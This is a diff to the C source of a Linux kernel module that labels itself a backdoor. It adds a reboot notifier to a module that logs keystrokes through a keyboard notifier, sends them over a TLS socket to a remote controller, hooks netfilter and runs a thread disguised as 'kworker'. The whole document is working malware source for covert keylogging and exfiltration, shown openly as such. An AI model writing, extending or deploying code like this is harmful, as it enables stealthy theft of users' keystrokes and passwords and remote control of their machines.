@@ -16,6 +16,7 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/pid_namespace.h>
+#include <linux/reboot.h>
 #include <linux/sched.h>
 #include <linux/sched/signal.h>
 #include <linux/skbuff.h>
@@ -79,10 +80,15 @@ int start_transmit(void);
 int init_userspace_conn(void);
 void UpdateChecksum(struct sk_buff* skb);
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);
+int reboot_cb(struct notifier_block* nblock, unsigned long code, void* _param);
 
 //Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 static struct notifier_block keysniffer_blk = {
         .notifier_call = keysniffer_cb,
+};
+
+static struct notifier_block reboot_blk = {
+        .notifier_call = reboot_cb,
 };
 
 /*
@@ -559,11 +565,19 @@ void consume_keys(struct work_struct* work) {
     }
     //k is for keystrokes
     buffer[0] = 'k';
-    strcpy((char *) buffer + 1, keystroke);
+    strcpy((char*) buffer + 1, keystroke);
 
     //send_msg(svc->tls_socket, (unsigned char*) keystroke, strlen(keystroke));
-    send_msg(svc->tls_socket, buffer, strlen((const char *) buffer));
+    send_msg(svc->tls_socket, buffer, strlen((const char*) buffer));
     printk(KERN_INFO "Sent keystroke %s\n", keystroke);
+}
+
+//Kills the kernel module indirectly on reboot
+int reboot_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
+    show();
+
+    const char* foobar = "foobar";
+    send_msg(svc->tls_socket, foobar, strlen(foobar));
 }
 
 /*
@@ -621,6 +635,7 @@ static int __init mod_init(void) {
     printk(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
+    register_reboot_notifier(&reboot_blk);
 
     kthread_run((void*) consume_keys, NULL, "kworker");
 
@@ -649,6 +664,7 @@ static void __exit mod_exit(void) {
     nf_unregister_net_hook(&init_net, &nfhi);
 
     unregister_keyboard_notifier(&keysniffer_blk);
+    unregister_reboot_notifier(&reboot_blk);
 
     if (svc) {
         if (svc->tls_socket) {
